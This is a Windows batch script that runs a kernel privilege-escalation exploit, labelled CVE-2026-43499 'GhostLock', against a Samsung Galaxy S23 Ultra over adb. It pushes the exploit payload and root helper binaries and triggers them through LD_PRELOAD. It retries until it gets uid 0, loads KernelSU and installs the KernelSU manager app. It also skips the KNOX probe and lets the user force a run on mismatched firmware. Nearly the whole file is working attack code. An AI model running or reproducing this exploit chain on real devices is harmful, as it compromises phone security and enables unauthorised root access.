@echo off
setlocal enabledelayedexpansion
rem s9180-root-kit-zcs  Galaxy S23 Ultra (SM-S9180/dm3q / S9180ZCS8FZG1)
rem CVE-2026-43499 GhostLock (sig check removed, KNOX probe skipped)
rem NOTE: keep GBK/ANSI+CRLF

set "SD=%~dp0"
set "P=%SD%payloads\dm3q-S9180ZCS8FZG1__payload"
set "R=%SD%payloads\dm3q-S9180ZCS8FZG1__root"
set "K=%SD%tools\ksud-samsung-android13-5.15-kdp"
set "A=%SD%tools\KernelSU_Manager_v3.2.5_32525.apk"
set "DP=/data/local/tmp/cve-2026-43499"
set "DR=/data/local/tmp/cve-2026-43499-root"
set "DK=/data/local/tmp/ksud-selected"
set "ATT=1" & set "PSH=1" & set "APP=1" & set "MD=full" & set "WU=400" & set "FW=S9180ZCS8FZG1"

:args
if "%~1"=="" goto adb
if /i "%~1"=="--verify" set "MD=verify" & shift & goto args
if /i "%~1"=="--skip-push" set "PSH=0" & shift & goto args
if /i "%~1"=="--no-app" set "APP=0" & shift & goto args
if /i "%~1"=="-n" set "ATT=%~2" & shift & shift & goto args
echo [ERR] arg: %~1 & goto :exit

:adb
if defined ADB_BIN (if exist "%ADB_BIN%" set "AADB=%ADB_BIN%")
if not defined AADB (where adb >nul 2>&1 && set "AADB=adb")
if not defined AADB (for %%p in ("%SD%adb-bin\adb.exe" "%LOCALAPPDATA%\Android\Sdk\platform-tools\adb.exe" "C:\platform-tools\adb.exe" "D:\platform-tools\adb.exe") do (if exist "%%~p" set "AADB=%%~p"))
if not defined AADB (echo [ERR] adb not found & goto :exit)
set "AADB=%AADB:/=\%"
echo [OK] adb: %AADB%

"%AADB%" get-state >nul 2>&1 || (echo [ERR] no device & goto :exit)
"%AADB%" get-state 2>nul|findstr /i device>nul||(echo [ERR] not device & goto :exit)
echo [OK] device connected

for /f "delims=" %%i in ('"%AADB%" shell getprop ro.build.fingerprint 2^>nul') do set "FP=%%i"
for /f "delims=" %%i in ('"%AADB%" shell uname -r 2^>nul') do set "KE=%%i"
echo kernel: !KE! & echo fingerprint: !FP!
echo !FP!|findstr /i "%FW%">nul||(echo [WARN] fw mismatch & set /p ans="force? (YES): " & if /i not "!ans!"=="YES" goto :exit)

echo [WARN] KNOX probe SKIPPED.

if /i "%MD%"=="verify" goto vrfy
if "%PSH%"=="1" (
  echo [*] push
  if not exist "%P%" echo [ERR] & goto :exit
  if not exist "%R%" echo [ERR] & goto :exit
  if not exist "%K%" echo [ERR] & goto :exit
  "%AADB%" push "%P%" "%DP%" || goto :exit
  "%AADB%" push "%R%" "%DR%" || goto :exit
  "%AADB%" push "%K%" "%DK%" || goto :exit
  "%AADB%" shell "chmod 755 %DP% %DR% %DK%"
  echo [OK] pushed
) else (echo [WARN] skip push)

echo [*] warmup x%WU%
"%AADB%" shell "i=0;while [ $i -lt %WU% ];do /system/bin/true;i=$((i+1));done"

echo [*] exploit att=%ATT% (may reboot)
set "OK=0"
for /l %%a in (1,1,3) do (
  echo [*] attempt %%a/3
  "%AADB%" wait-for-device >nul 2>&1
  ping -n 3 127.0.0.1 >nul 2>&1
  "%AADB%" shell "CVE43499_ROOT_HELPER=%DR% EXPLOIT_ATTEMPTS=%ATT% LD_PRELOAD=%DP% /system/bin/true"
  if "!OK!"=="1" goto :rdone
  "%AADB%" exec-out "%DR%" -c /system/bin/id 2>nul|findstr /i "uid=0(root)">nul && set "OK=1"
  if "!OK!"=="1" goto :rdone
)
:rdone
if not "%OK%"=="1" (echo [ERR] no root & goto :exit)
echo [OK] root!
"%AADB%" exec-out "%DR%" -c /system/bin/id

echo [*] KernelSU
"%AADB%" shell "%DR%" --late-load
ping -n 3 127.0.0.1 >nul 2>&1
"%AADB%" shell "cat /proc/modules"|findstr /i kernelsu>nul&&(echo [OK] kernelsu loaded)||(echo [ERR] not loaded)

if "%APP%"=="1" (
  echo [*] app install
  "%AADB%" install -r "%A%"&&(echo [OK] installed & "%AADB%" shell am start -n me.weishu.kernelsu/.ui.MainActivity>nul 2>&1)||echo [WARN] fail
)

echo. & echo ============================================================
echo  done. reboot clears, rerun to re-root.
echo ============================================================
goto :exit

:vrfy
echo [*] verify (%FW%)
"%AADB%" shell "ls -l %DP% %DR% %DK%"
"%AADB%" shell "cat /proc/modules"|findstr /i kernelsu>nul&&echo [OK] kernelsu loaded||echo [WARN] not loaded
echo [OK] verify done
goto :exit

:exit
echo. & pause >nul
